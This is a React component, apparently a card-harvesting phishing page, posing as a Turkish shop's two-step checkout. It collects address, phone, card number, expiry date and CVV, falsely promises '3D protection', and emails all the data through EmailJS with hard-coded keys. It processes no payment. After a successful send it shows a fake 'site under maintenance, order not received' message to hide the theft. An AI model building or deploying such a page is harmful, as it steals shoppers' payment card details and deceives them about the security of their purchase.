import "./SiparisVer.css";
import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const SiparisVer = () => {
  const form = useRef();

  const [step, setStep] = useState(1);
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [city, setCity] = useState("");
  const [district, setDistrict] = useState("");
  const [address, setAddress] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");

  const handleNextStep = () => {
    setStep(2);
  };

  const handleBackStep = () => {
    setStep(1);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_mwe4ukl", "template_8gxpbwd", form.current, {
        publicKey: "V57OWPDudEhHuEDPU",
      })
      .then(
        () => {
          alert(
            "Sitemiz bakımda lütfen mağazamızdan satın alın. Siparişiniz alınamadı."
          );
        },
        (error) => {
          alert("Sipariş alınamadı. Kart bilgilerini kontrol edin.");
        }
      );
    // Form verilerini işleyin
    console.log({
      name,
      phone,
      city,
      district,
      address,
      cardName,
      cardNumber,
      expiryDate,
      cvv,
    });
  };

  return (
    <div className="flex siparis-ver items-center justify-center min-h-screen">
      <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg shadow-md">
        {step === 1 && (
          <>
            <h2 className="text-2xl font-bold text-center">Adres Bilgileri</h2>
            <div class="w-full bg-orange-500 p-5 rounded text-white font-bold">
              Aşağıda belirttiğiniz bilgilere göre fatura düzenlenecek ve
              telefon numaranıza gönderilecektir.
            </div>
            <form className="space-y-4" ref={form} onSubmit={handleNextStep}>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  Ad Soyad
                </label>
                <input
                  type="text"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  placeholder="Ad ve Soyad"
                  name="isim"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  Telefon Numarası
                </label>
                <input
                  type="text"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  placeholder="Telefon Numarası"
                  name="tel"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  İl
                </label>
                <input
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  placeholder="İl"
                  name="il"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  İlçe
                </label>
                <input
                  type="text"
                  value={district}
                  onChange={(e) => setDistrict(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  placeholder="İlçe"
                  name="ilce"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  Adres
                </label>
                <input
                  type="text"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  placeholder="Açık Adres"
                  name="adres"
                />
              </div>
              <button
                type="button"
                onClick={handleNextStep}
                className="w-full px-4 py-2 text-white bg-orange-600 rounded-md hover:bg-orange-700 focus:outline-none focus:ring focus:ring-indigo-200"
              >
                İleri
              </button>
            </form>
          </>
        )}
        {step === 2 && (
          <>
            <h2 className="text-2xl font-bold text-center">Ödeme Bilgileri</h2>
            <div class="w-full bg-orange-500 p-5 rounded text-white font-bold">
              Tüm ödeme yöntemleri 3D koruma içerir. Bu sayede güvenle alışveriş
              yapabilirsiniz. Bizi tercih ettiğiniz için teşekkürler, yine
              bekleriz.
            </div>
            <form className="space-y-4" ref={form} onSubmit={handleSubmit}>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  Kart Sahibi Ad Soyad
                </label>
                <input
                  type="text"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  name="kartSahibi"
                  placeholder="Kart Sahibi Ad Soyad"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  Kredi Kartı Numarası
                </label>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  name="kartNumarasi"
                  placeholder="Kart Numarası"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  Son Kullanma Tarihi
                </label>
                <input
                  type="text"
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  placeholder="MM/YY"
                  required
                  name="sonKullanmaTarihi"
                />
              </div>
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">
                  CVV
                </label>
                <input
                  type="text"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-orange-300"
                  required
                  name="cvc"
                  placeholder="Güvenlik Kodu"
                />
              </div>
              <div className="flex justify-between gap-1">
                <button
                  type="button"
                  onClick={handleBackStep}
                  className="w-1/3 px-4 py-2 text-white bg-gray-600 rounded-md hover:bg-gray-700 focus:outline-none focus:ring focus:ring-indigo-200"
                >
                  Geri
                </button>
                <button
                  type="submit"
                  className="w-2/3 px-4 py-2 text-white bg-orange-600 rounded-md hover:bg-orange-700 focus:outline-none focus:ring focus:ring-indigo-200"
                >
                  Ödemeyi Yap
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default SiparisVer;
